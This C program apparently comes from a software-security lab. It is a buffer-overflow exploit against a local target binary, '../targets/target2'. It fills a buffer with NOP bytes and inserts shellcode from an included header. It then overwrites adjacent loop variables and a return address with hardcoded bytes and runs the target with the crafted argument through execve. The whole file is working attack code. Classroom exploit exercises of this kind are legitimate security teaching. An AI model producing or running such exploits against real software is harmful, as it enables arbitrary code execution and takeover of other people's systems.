#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define DEFAULT_BUFFER_SIZE  140
#define NOP 0x90
#define ZERO 0x00
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	int bsize = DEFAULT_BUFFER_SIZE;
	char* buff, *ptr;
	if (argc>1) bsize = atoi(argv[1]);	
	
	if(!(buff = (char*)malloc(bsize * sizeof(char)))){
		printf("can't allocate memory\n");
		exit(0);	
	}

	unsigned long *add_ptr;
	int i;
	for (i = 0; i < bsize; i++){
		buff[i] = NOP;
	}
	//printf("the size of input is %d\n",strlen(buff));

	ptr = buff + bsize - strlen(shellcode)  - 28;
	for (i=0; i<strlen(shellcode); i++){
		*(ptr++) = shellcode[i];
	}


	ptr = buff + bsize  - 20;
	// overwriting j and len to -20 and -1
	for (i=0; i<4; i++){	
		if (i<=2){
			*(ptr++) = 0x00;
		}
		else{
			*(ptr++) = 0x00;	
		}
	}
	ptr = buff + bsize  - 16;
	for (i=0; i<4; i++){	
		if (i == 0){
			*(ptr++) = 0x13;
		}		
		else if (i>0 && i<=2){
			*(ptr++) = 0x01;
		}
		else{
			*(ptr++) = 0xFF;	
		}
	}

	ptr = buff + bsize  - 4;
	*ptr = 0x40;
	ptr++;
	*ptr = 0xfd;
	ptr++;
	*ptr = 0xa4;
	ptr++;
	*ptr = 0x40;


	//char * s = "\x40\xfd\xa4\x40\x00";
	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;
	//printf("the size of input is %d\n",strlen(args[1]));
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
